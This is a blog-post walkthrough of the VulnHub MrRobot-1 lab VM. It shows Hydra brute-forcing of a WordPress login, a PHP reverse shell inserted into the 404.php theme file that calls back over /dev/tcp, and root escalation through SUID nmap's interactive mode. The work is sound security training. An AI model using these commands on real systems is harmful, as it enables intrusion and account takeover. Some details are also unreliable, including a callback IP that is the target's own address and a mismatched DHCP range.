<!DOCTYPE html>
<html lang="en-us">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width">
    <script type="application/javascript" src='http://localhost:1313/js/theme-mode.js'></script>
    <link rel="stylesheet" href='http://localhost:1313/css/frameworks.min.css' />
    <link rel="stylesheet" href='http://localhost:1313/css/github.min.css' />
    <link rel="stylesheet" href='http://localhost:1313/css/github-style.css' />
    <link rel="stylesheet" href='http://localhost:1313/css/light.css' />
    <link rel="stylesheet" href='http://localhost:1313/css/dark.css' />
    <link rel="stylesheet" href='http://localhost:1313/css/syntax.css' />
    <title>MrRobot-1 VulnHub Challenge – Full Walkthrough - Kjersheim - Projects &amp; Docs</title>
    
    <link rel="icon" type="image/x-icon" href='http://localhost:1313/images/favicon.ico'>
    
    <meta name="theme-color" content="#1e2327">

    
    

    
    <meta name="description"
  content="A full penetration test walkthrough of the MrRobot-1 VM from VulnHub, including network setup, enumeration, brute force login with Hydra, exploitation via reverse shell, privilege escalation, and root flag discovery." />
<meta name="keywords"
  content='' />
<meta name="robots" content="noodp" />
<link rel="canonical" href="http://localhost:1313/post/mrrobot/" />


<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="MrRobot-1 VulnHub Challenge – Full Walkthrough - Kjersheim - Projects &amp; Docs" />
<meta name="twitter:description"
  content="A full penetration test walkthrough of the MrRobot-1 VM from VulnHub, including network setup, enumeration, brute force login with Hydra, exploitation via reverse shell, privilege escalation, and root flag discovery." />
<meta name="twitter:site" content="http://localhost:1313/" />
<meta name="twitter:creator" content="" />
<meta name="twitter:image"
  content="http://localhost:1313/">


<meta property="og:type" content="article" />
<meta property="og:title" content="MrRobot-1 VulnHub Challenge – Full Walkthrough - Kjersheim - Projects &amp; Docs">
<meta property="og:description"
  content="A full penetration test walkthrough of the MrRobot-1 VM from VulnHub, including network setup, enumeration, brute force login with Hydra, exploitation via reverse shell, privilege escalation, and root flag discovery." />
<meta property="og:url" content="http://localhost:1313/post/mrrobot/" />
<meta property="og:site_name" content="MrRobot-1 VulnHub Challenge – Full Walkthrough" />
<meta property="og:image"
  content="http://localhost:1313/">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

<meta property="article:published_time" content="2024-01-12 00:00:00 &#43;0000 UTC" />











</head>


<body>
  <div style="position: relative">
  <header class="Header js-details-container Details px-3 px-md-4 px-lg-5 flex-wrap flex-md-nowrap open Details--on">
    <div class="Header-item mobile-none" style="margin-top: -4px; margin-bottom: -4px;">
      <a class="Header-link" href="http://localhost:1313/">
        <img class="octicon" height="32" width="32" src="/images/avatar.svg">
      </a>
    </div>
    <div class="Header-item d-md-none">
      <button class="Header-link btn-link js-details-target" type="button"
        onclick="document.querySelector('#header-search').style.display = document.querySelector('#header-search').style.display == 'none'? 'block': 'none'">
        <svg height="24" class="octicon octicon-three-bars" viewBox="0 0 16 16" version="1.1" width="24">
          <path fill-rule="evenodd" d="M1 2.75A.75.75 0 011.75 2h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 2.75zm0 5A.75.75 0 011.75 7h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 7.75zM1.75 12a.75.75 0 100 1.5h12.5a.75.75 0 100-1.5H1.75z">
          </path>
        </svg>
      </button>
    </div>
    <div style="display: none;" id="header-search"
      class="Header-item Header-item--full flex-column flex-md-row width-full flex-order-2 flex-md-order-none mr-0 mr-md-3 mt-3 mt-md-0 Details-content--hidden-not-important d-md-flex">
      <div
        class="Header-search header-search flex-auto js-site-search position-relative flex-self-stretch flex-md-self-auto mb-3 mb-md-0 mr-0 mr-md-3 scoped-search site-scoped-search js-jump-to">
        <div class="position-relative">
          
          <form target="_blank" action="https://www.google.com/search" accept-charset="UTF-8" method="get"
            autocomplete="off">
            <label
              class="Header-search-label form-control input-sm header-search-wrapper p-0 js-chromeless-input-container header-search-wrapper-jump-to position-relative d-flex flex-justify-between flex-items-center">
              <input type="text"
                class="Header-search-input form-control input-sm header-search-input jump-to-field js-jump-to-field js-site-search-focus js-site-search-field is-clearable"
                name="q" value="" placeholder="Search" autocomplete="off">
              <input type="hidden" name="q" value="site:http://localhost:1313/">
            </label>
          </form>
          
        </div>
      </div>
    </div>

    <div class="Header-item Header-item--full flex-justify-center d-md-none position-relative">
      <a class="Header-link " href="http://localhost:1313/">
        <img class="octicon octicon-mark-github v-align-middle" height="32" width="32" src="/images/avatar.svg">
      </a>
    </div>
    <div class="Header-item" style="margin-right: 0;">
      <a href="javascript:void(0)" class="Header-link no-select" onclick="switchTheme()">
        <svg style="fill: var(--color-profile-color-modes-toggle-moon);" class="no-select" viewBox="0 0 16 16"
          version="1.1" width="16" height="16">
          <path fill-rule="evenodd" clip-rule="evenodd"
            d="M4.52208 7.71754C7.5782 7.71754 10.0557 5.24006 10.0557 2.18394C10.0557 1.93498 10.0392 1.68986 10.0074 1.44961C9.95801 1.07727 10.3495 0.771159 10.6474 0.99992C12.1153 2.12716 13.0615 3.89999 13.0615 5.89383C13.0615 9.29958 10.3006 12.0605 6.89485 12.0605C3.95334 12.0605 1.49286 10.001 0.876728 7.24527C0.794841 6.87902 1.23668 6.65289 1.55321 6.85451C2.41106 7.40095 3.4296 7.71754 4.52208 7.71754Z">
          </path>
        </svg>
      </a>
    </div>
  </header>
</div>

  <div id="search-result" class="container-lg px-3 new-discussion-timeline" style="display: none;">
</div>

  
<div class="application-main">
  <div>
  <main>
    <div class="gisthead pagehead bg-gray-light pb-0 pt-3 mb-4">
      <div class="px-0">
        <div class="mb-3 d-flex px-3 px-md-3 px-lg-5">
          <div class="flex-auto min-width-0 width-fit mr-3">
            <div class="d-flex">
              <div class="d-none d-md-block">
                <a class="avatar mr-2 flex-shrink-0" href="http://localhost:1313/">
                  <img class=" avatar-user"
                    src="/images/avatar.png"
                    width="32" height="32"></a>
              </div>
              <div class="d-flex flex-column">
                <h1 class="break-word f3 text-normal mb-md-0 mb-1">
                  <span class="author">
                    <a href="http://localhost:1313/">Andreas</a>
                  </span>
                  <span class="path-divider">/</span>
                  <strong class="css-truncate css-truncate-target mr-1" style="max-width: 410px">
                    <a href="http://localhost:1313/post/mrrobot/">MrRobot-1 VulnHub Challenge – Full Walkthrough</a>
                  </strong>
                </h1>
                <div class="note m-0">
                  Created <relative-time datetime="Fri, 12 Jan 2024 00:00:00 &#43;0000"
                    class="no-wrap">
                    Fri, 12 Jan 2024 00:00:00 &#43;0000</relative-time>

                  
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div class="container-lg px-3 new-discussion-timeline">
      <div class="repository-content gist-content">
        <div>
          <div class="js-gist-file-update-container js-task-list-container file-box">
            <div id="file-pytest" class="file my-2">
              <div id="post-header" class="file-header d-flex flex-md-items-center flex-items-start sticky-header" style="z-index: 2">
                <div class="file-info d-flex flex-md-items-center flex-items-start flex-order-1 flex-auto">
                  <div class="text-mono f6 flex-auto pr-3 flex-order-2 flex-md-order-1 mt-2 mt-md-0">
                    
                    <summary id="toc-toggle" onclick="clickToc()" class="btn btn-octicon m-0 mr-2 p-2">
                      <svg aria-hidden="true" viewBox="0 0 16 16" height="16" width="16" class="octicon octicon-list-unordered">
                        <path fill-rule="evenodd" d="M2 4a1 1 0 100-2 1 1 0 000 2zm3.75-1.5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zM3 8a1 1 0 11-2 0 1 1 0 012 0zm-1 6a1 1 0 100-2 1 1 0 000 2z"></path>
                      </svg>
                    </summary>
                    <details-menu class="SelectMenu" id="toc-details" style="display: none;">
                      <div class="SelectMenu-modal rounded-3 mt-1" style="max-height: 340px;">
                        <div class="SelectMenu-list SelectMenu-list--borderless p-2" style="overscroll-behavior: contain;" id="toc-list">
                        </div>
                      </div>
                    </details-menu>
                      1719 Words
                    

                  </div>
                  <div class="file-actions flex-order-2 pt-0">
                    
                  </div>
                </div>
              </div>


              <div class="Box-body px-5 pb-5" style="z-index: 1">
                <article class="markdown-body entry-content container-lg"><h1 id="mrrobot-1-vulnhub-challenge-a-complete-walkthrough">MrRobot-1 VulnHub Challenge: A Complete Walkthrough</h1>
<h2 id="introduction">Introduction</h2>
<p>I came across the MrRobot-1 on Vulnhub, and chose to have a closer look, due to its beginner-to-intermediate difficulty and clear objectives: find three hidden keys within the VM. The story, inspired by the TV series <em>Mr. Robot</em>, promised straightforward enumeration and exploitation without deep reverse-engineering. I began the exercise at 10 AM on Thursday, January 11, 2024, and wrapped it up around 11 AM the next day, spending roughly nine hours experimenting, researching, and documenting.</p>
<h2 id="verifying-the-vm-and-ensuring-file-integrity">Verifying the VM and Ensuring File Integrity</h2>
<p>Downloading community-provided VM images can be risky, so I always verify checksums before importing. After grabbing the <code>MrRobot-1.ova</code> and its MD5/SHA1 hashes, I restored the file flagged and quarantined by Windows Defender. A quick hash comparison confirmed the download’s integrity.<br>
<img src="/images/mrrobot1/1.jpg" alt="File integrity"></p>
<p>With the checksums matching VulnHub’s published values, I imported the OVA into VirtualBox. It’s best practice to dedicate a separate host-only or internal network for penetration tests to prevent accidental leaks and keep target systems isolated.</p>
<h2 id="networking-and-dhcp-setup">Networking and DHCP Setup</h2>
<p>I configured both my Kali and the MrRobot-1 VM on a VirtualBox internal network. At first, no DHCP server was present, so the Kali VM lacked an IP address. After locating <code>VBoxManage</code>’s DHCP management section, I created a new DHCP range (10.0.0.2–10.0.0.254) on the <code>vboxnet0</code> interface and restarted Kali.</p>
<p><img src="/images/mrrobot1/2.jpg" alt="VirtualBox network set to internal">
<img src="/images/mrrobot1/3.jpg" alt="Setting up a local dhcp"></p>
<p>With DHCP in place, Kali received 192.168.3.2, confirming network connectivity. From there, I could begin active reconnaissance against the MrRobot-1 target.</p>
<h2 id="discovering-the-target-and-web-enumeration">Discovering the Target and Web Enumeration</h2>
<p>Running a quick <code>netdiscover</code> scan on the internal subnet revealed two live hosts, my Kali VM and another at 192.168.3.3. Browsing to <code>http://192.168.3.3</code> showed a custom website with several menu items.</p>
<p><img src="/images/mrrobot1/4.jpg" alt="Nmap discovery for the network"></p>
<p>Attempting HTTPS produced the same site over port 443.</p>
<p><img src="/images/mrrobot1/5.jpg" alt="Browser page found hosted on the server"></p>
<p>A peek at the HTML source exposed numerous JavaScript files, but nothing obvious jumped out beyond styling and video embeds. I decided to focus on standard web enumeration next.</p>
<h2 id="first-key-via-robotstxt">First Key via robots.txt</h2>
<p>Every web crawler first checks <code>robots.txt</code> for disallowed paths, and in this case, the file contained a direct link to <code>key-1-of-3.txt</code>. Retrieving it revealed:<br>
<img src="/images/mrrobot1/6.jpg" alt="First key found in robots.txt file"></p>
<p>Basic directory enumeration either manually from known files such as the robots.txt, or with tools like dirbuster, gives great insights before diving into more complex attacks.</p>
<h2 id="mirroring-the-site-and-directory-busting">Mirroring the Site and Directory Busting</h2>
<p>To explore the site offline and gather all available files for analysis, I mirrored the webserver recursively:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget -r --no-parent http://192.168.3.3/
</span></span></code></pre></div><p>After the download completed, I used <code>grep</code> to search for any occurrences of the word “key” within the downloaded directory tree:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -Rnwo . -e <span style="color:#e6db74">&#39;key&#39;</span>
</span></span></code></pre></div><p>This command had several options working together to ensure a comprehensive download. It mirrored the webpage by recursively retrieving linked pages and their content, such as images and CSS files (with the &ldquo;m&rdquo; and &ldquo;p&rdquo; options).
The &ldquo;E&rdquo; option handled file extensions, while the &ldquo;k&rdquo; option converted links within HTML files for
local use. This approach provided a complete snapshot of the webpage, enabling a thorough examination that led to the discovery of the hidden fsocity.dic file in the robots.txt file.</p>
<p>Although wget is a powerful command-line tool for such tasks, alternative methods exist. Browser
extensions like &ldquo;Save Page WE&rdquo; (for Firefox) or &ldquo;Download All Images&rdquo; (for Chrome) offer a more
user-friendly approach with one-click downloads. Graphical download managers such as &ldquo;Internet
Download Manager&rdquo; and &ldquo;Free Download Manager&rdquo; provide intuitive interfaces. However, wget
remains favored for automation and complex mirroring tasks due to its command-line efficiency
and flexibility, making it essential for tasks like web scraping.</p>
<p>However, it became clear that not all files were retrieved by this command, specifically, neither <code>key-1-of-3.txt</code> nor <code>fsocity.dic</code> appeared in the mirrored output files, from a few greps. To access these, I navigated directly to:</p>
<p>http://192.168.3.3/key-1-of-3.txt</p>
<p>http://192.168.3.3/fsocity.dic</p>
<p>From these links, I downloaded the files manually. Inspecting <code>fsocity.dic</code>, I noted that it contained a large list of words (over 11,000 unique entries after sorting and de-duplicating). I extracted only the unique words to a separate file for use as a wordlist:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sort fsocity.dic | uniq &gt; fsocity.dic.uniq
</span></span></code></pre></div><h2 id="web-directory-enumeration">Web Directory Enumeration</h2>
<p>To identify any hidden or unlinked directories on the webserver, I performed directory enumeration using Nmap with the <code>http-enum</code> script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p 80,443 --script<span style="color:#f92672">=</span>http-enum 192.168.3.3
</span></span></code></pre></div><p>Another option with a GUI for those who prefer that, is Dirbuster. With the latter we have an option to also add dictionaries/wordlists for a quick (relatively) scan based on most common paths. The NMAP scan revealed several potentially interesting paths:</p>
<pre><code>/admin/

/wp-login.php

/robots.txt

WordPress version-related directories (e.g., /wp-content/, /wp-includes/)

/readme.html
</code></pre>
<p>Next, I ran Nikto to cross-verify these findings:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>    nikto -h http://192.168.3.3
</span></span></code></pre></div><p>Nikto’s output confirmed the presence of the WordPress login page at <code>/wp-login.php</code> along with other standard WordPress resources. Visiting <code>http://192.168.3.3/wp-login.php</code> in the browser displayed:</p>
<p><img src="/images/mrrobot1/7.jpg" alt="WordPress login page"></p>
<p>With these directories identified, I prepared to attempt brute-forcing the WordPress login.</p>
<hr>
<h2 id="brute-force-login-with-hydra">Brute-Force Login with Hydra</h2>
<h3 id="intercepting-the-login-request">Intercepting the Login Request</h3>
<p>To understand how WordPress handles login submissions, I used Burp Suite to capture a sample POST request when attempting to log in with test credentials. By turning on the proxy and submitting dummy data at <code>http://192.168.3.3/wp-login.php</code>, I observed the following form data structure:</p>
<p><img src="/images/mrrobot1/8.jpg" alt="Burpsuite"></p>
<pre><code>POST /wp-login.php HTTP/1.1

Host: 192.168.3.3
...
log=&lt;USERNAME&gt;&amp;pwd=&lt;PASSWORD&gt;&amp;wp-submit=Log+In&amp;redirect_to=...&amp;testcookie=1
</code></pre>
<p>This confirmed the parameters needed for Hydra.</p>
<h3 id="using-hydra-to-brute-force-the-username">Using Hydra to Brute-Force the Username</h3>
<p>Because WordPress returns a distinct “Invalid username” message when a nonexistent username is entered, I first enumerated valid usernames. I instructed Hydra to use a static password (<code>wedontcare</code>) while iterating through <code>fsocity.dic.uniq</code> as potential usernames:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -vV -L fsocity.dic.uniq -p wedontcare 192.168.3.3 http-post-form <span style="color:#e6db74">&#34;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=Invalid username&#34;</span> -o hydra_user_results.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Source: Tafani-Dereeper, <span style="color:#ae81ff">2017</span>
</span></span></code></pre></div><p>After several minutes, Hydra identified that “elliot” (in any case variation) was a valid username.</p>
<h3 id="using-hydra-to-brute-force-the-password">Using Hydra to Brute-Force the Password</h3>
<p>With the username “elliot” confirmed, I switched to a password-only brute-force, targeting the same login form:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -vV -l elliot -P fsocity.dic.uniq 192.168.3.3 http-post-form <span style="color:#e6db74">&#34;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=is incorrect&#34;</span> -o hydra_pass_results.txt
</span></span></code></pre></div><p><img src="/images/mrrobot1/9.jpg" alt="Password found"></p>
<p>Hydra found the password to be: elliot:ER28-0652</p>
<p>Armed with these credentials, I logged into the WordPress dashboard at <code>http://192.168.3.3/wp-admin/</code>.</p>
<p><img src="/images/mrrobot1/10.jpg" alt="WP Login successful"></p>
<p>Upon entering the dashboard, I saw that “elliot” held administrative privileges. No obvious clues for the remaining keys were visible in the admin interface itself, but I did note a subscriber account (<code>mich05654</code>) with the display name “Krista Gordon,” which could be relevant later.</p>
<hr>
<h2 id="exploitation-via-reverse-shell-plugin">Exploitation via Reverse Shell Plugin</h2>
<p>Rather than running a full WPScan (which would require internet connectivity and updating databases), I focused on a known vulnerable method: Reverse Shell, attempting to test if one could upload a PHP reverse shell payload.</p>
<p><strong>Locate a writable theme file (404.php)</strong><br>
In the Appearance → Theme Editor, I found a <code>404.php</code> file in the active theme’s directory (e.g., <code>/var/www/html/wp-content/themes/twentytwentyone/404.php</code>).</p>
<p><strong>Insert reverse shell payload</strong><br>
I edited <code>404.php</code> and added the following PHP snippet at the top, modifying the IP to my Kali VM (192.168.3.3) and choosing port 4444:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.3.3/4444 0&gt;&amp;1&#39;&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>Start a netcat listener on Kali:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">4444</span>
</span></span></code></pre></div><p><img src="/images/mrrobot1/11.jpg" alt="PHP code injection, having a listener active in a separate terminal"></p>
<h2 id="trigger-the-payload">Trigger the payload</h2>
<p>By visiting a non-existent page (e.g., http://192.168.3.3/nonexistentpage), WordPress returned a 404, executing our modified 404.php and providing a reverse shell:</p>
<pre tabindex="0"><code>connection from 192.168.3.3:4444 received on tty /dev/pts/1
</code></pre><p>At this point, I had a shell as www-data on the target VM:</p>
<p><img src="/images/mrrobot1/12.jpg" alt="Reverse shell opened"></p>
<h1 id="second-key-found-key-2-of-3txt">Second Key Found (key-2-of-3.txt)</h1>
<p>Once in the shell, I navigated to the WordPress web directory and located two files in the home directory of the “robot” user:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /home/robot
</span></span><span style="display:flex;"><span>ls -la
</span></span><span style="display:flex;"><span>key-2-of-3.txt  password.raw-md5
</span></span></code></pre></div><p>To open the key file we need to gain access to the user robot. Trying to see if the password file has a known hash-value by
searching existing databases on a separate box connected to the internet. By a quick search, it suggested the MD5
Hash-value could be the list of letters in the english alphabet:</p>
<blockquote>
<p>abcdefghijklmnopqrstuvwxyz</p></blockquote>
<p>Attempting to log into robot with this password revealed the limitations of the initial shell, and I
found a method from a user nwrzd (2019), to start a tty shell. From there we managed to open the
second key text-file.</p>
<p><img src="/images/mrrobot1/13.jpg" alt="Second key"></p>
<h2 id="gaining-root-access-and-finding-the-third-key">Gaining Root Access and Finding the Third Key</h2>
<h3 id="enumerating-sudo-and-suid">Enumerating Sudo and SUID</h3>
<p>As robot, I checked sudo privileges:</p>
<p>sudo -l</p>
<p>No direct sudo rights were granted to robot. Instead, I searched for any SUID binaries owned by root:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -4000 -type f 2&gt;/dev/null
</span></span></code></pre></div><p><img src="/images/mrrobot1/14.jpg" alt="SUID binaries owned by root"></p>
<p>Among the results was <code>/usr/bin/nmap</code>, which on many older systems has an interactive mode permitting shell escapes.</p>
<h3 id="exploiting-nmaps-interactive-mode">Exploiting Nmap’s Interactive Mode</h3>
<p>I ran <code>nmap</code> in interactive mode with root privileges by taking advantage of the SUID bit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/bin/nmap --interactive
</span></span></code></pre></div><p><img src="/images/mrrobot1/15.jpg" alt="Using Nmap through interactive mode, resulting in root privileges"></p>
<h2 id="reading-the-third-key">Reading the Third Key</h2>
<p>With root privileges, I searched for key-3:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -type f -iname <span style="color:#e6db74">&#39;key-3-of-3.txt&#39;</span> 2&gt;/dev/null
</span></span></code></pre></div><p><img src="/images/mrrobot1/16.jpg" alt="As root, searching for the third and final flag"></p>
<h1 id="summary-and-discussion">Summary and Discussion</h1>
<p>The MrRobot-1 VulnHub challenge provided a curious and practical penetration testing scenario with clear, progressively harder objectives, with some emphazis on file integrity verification and verification initially, as well as setting up a secure isolated environment so the files within the challenges can not reach the host machine, nor the internet, for the investigation. Setting up a dns server was an additional point of learning, which is always positive!</p>
<h2 id="web-enumeration-techniques-summary">Web Enumeration Techniques Summary</h2>
<pre><code>Examine robots.txt for clues to hidden files (e.g., key-1-of-3.txt).

Mirror the site with wget to retrieve static files for offline analysis, then use grep to locate strings like “key.” 

Credential Harvesting with Hydra

    Brute-force usernames first (WordPress clearly differentiates “Invalid username”).

    Once a username is validated, target the password with a wordlist derived from site resources (e.g., fsocity.dic.uniq).

    Capture successful credentials and gain administrative access to WordPress.

Exploitation via Vulnerable Plugins

    Identify and leverage a vulnerable WordPress plugin (Reverse Shell) to upload a PHP payload and obtain a reverse shell as www-data.

Privilege Escalation

    Locate SUID binaries (e.g., nmap) that can spawn an interactive shell.

    Escalate from a limited www-data/robot user to root.

Hidden Rewards (Three Keys)

    Key 1: Found in robots.txt.

    Key 2: Located in /home/robot/key-2-of-3.txt (requires reverse shell + TTY upgrade).

    Key 3: Stored at /root/key-3-of-3.txt (obtained via SUID nmap exploit).
</code></pre>
<p>Overall, this exercise reinforces the critical importance of strong password policies, diligent web enumeration, and careful privilege escalation techniques. It highlights how seemingly minor misconfigurations, an exposed robots.txt, an outdated plugin, or a SUID binary, can lead to total system compromise. Continuous learning, thorough enumeration, and methodical exploitation are essential practices for any aspiring or seasoned penetration tester.</p>
<h2 id="references">References</h2>
<p>Christophe Tafani-Dereeper, 2017. [Write Up] Mr Robot. <a href="https://blog.christophetd.fr/write-up-mr-robot">https://blog.christophetd.fr/write-up-mr-robot</a></p>
<p>ZeusCybersec, Sept. 2021. TryHackMe-Mr Robot CTF Writeup. <a href="https://sparshjazz.medium.com/tryhackme-mr-robot-ctf-writeup-d2ccad34e6b7">https://sparshjazz.medium.com/tryhackme-mr-robot-ctf-writeup-d2ccad34e6b7</a></p>
<p>Nwrzd, Sept. 2019. Vulnhub.com : Mr-Robot: 1 Walkthrough. <a href="https://nwrzd.medium.com/vulnhub-com-mr-robot-1-walkthrough-5119586b2a3f">https://nwrzd.medium.com/vulnhub-com-mr-robot-1-walkthrough-5119586b2a3f</a></p>
<p>Seven Layers, 2024. WordPress Plugin: Reverse Shell. <a href="https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell">https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell</a></p>
</article>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </main>
</div>
<script type="application/javascript" src='http://localhost:1313/js/toc.js'></script>
<link rel="stylesheet" href='http://localhost:1313/css/toc.css' />

  
</div>

  <div class="footer container-xl width-full p-responsive">
  <div
    class="position-relative d-flex flex-row-reverse flex-lg-row flex-wrap flex-lg-nowrap flex-justify-center flex-lg-justify-between flex-sm-items-center pt-6 pb-2 mt-6 f6 text-gray border-top border-gray-light ">
    <a aria-label="Homepage" title="GitHub" class="footer-octicon d-none d-lg-block mr-lg-4" href="http://localhost:1313/">
      <svg height="24" class="octicon octicon-mark-github" viewBox="0 0 16 16" version="1.1" width="24">
        <path fill-rule="evenodd"
          d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z">
        </path>
      </svg>
    </a>
    <ul class="list-style-none d-flex flex-wrap col-12 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0">
      
      <li class="mr-3 mr-lg-0">Theme by <a href='https://github.com/MeiK2333/github-style'>github-style</a></li>
      
      <li class="mr-3 mr-lg-0">GitHub and the Invertocat logo are trademarks of <a href="https://github.com/">GitHub, Inc.</a></li>
    </ul>
  </div>
  <div class="d-flex flex-justify-center pb-6">
    <span class="f6 text-gray-light"></span>
  </div>


</div>

</body>

<script type="application/javascript" src="http://localhost:1313/js/github-style.js"></script>







</html>